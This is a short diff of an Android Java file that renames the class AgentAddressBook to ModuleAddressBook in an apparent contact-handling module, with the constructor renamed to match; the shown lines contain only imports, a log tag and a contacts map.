@@ -30,7 +30,7 @@ import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
-public class AgentAddressBook extends BaseModule {
+public class ModuleAddressBook extends BaseModule {
 
 	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
 
@@ -40,7 +40,7 @@ public class AgentAddressBook extends BaseModule {
 
 	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
 
-	public AgentAddressBook() {
+	public ModuleAddressBook() {
 
 	}
 
